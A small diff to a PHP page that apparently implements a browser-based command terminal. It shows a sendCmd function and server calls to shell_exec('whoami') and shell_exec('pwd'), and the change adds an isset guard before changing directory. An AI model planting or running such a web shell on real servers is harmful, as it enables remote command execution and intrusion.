@@ -93,7 +93,9 @@ sendCmd = function(command) {
 
 <body onclick="document.getElementById('command').focus()">
 <?php
-chdir($_SESSION['cwd']);
+if (true === isset($_SESSION['cwd'])) {
+    chdir($_SESSION['cwd']);
+}
 $user = str_replace("\n","",shell_exec("whoami"));
 $cwd = str_replace("\n","",shell_exec("pwd"));
 ?>
